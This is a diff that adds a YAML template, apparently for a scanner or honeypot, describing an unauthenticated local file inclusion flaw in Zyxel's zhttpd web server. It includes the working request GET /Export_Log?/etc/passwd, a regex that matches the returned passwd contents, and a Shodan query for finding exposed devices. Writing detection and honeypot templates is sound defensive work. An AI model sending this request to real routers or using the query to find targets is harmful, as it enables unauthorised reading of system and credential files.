@@ -1,0 +1,34 @@
+id: unauth-lfd-zhttpd
+info:
+  name: zhttpd - Local File Inclusion
+  author: EvergreenCartoons
+  description: 'zhttpd is vulnerable to unauthenticated local inclusion including
+    privileged files such as /etc/shadow. An attacker can read all files on the system
+    by using this endpoint.
+
+    '
+  severity: high
+  reference:
+  - https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/
+  - https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/
+  - https://github.com/rapid7/metasploit-framework/pull/17388
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"VMG1312-B10D"
+  tags: misconfig,unauth,zyxel,lfi,msf
+traps:
+- request:
+    method: GET
+    path: /Export_Log?/etc/passwd
+    headers:
+      Accept: '*/*'
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
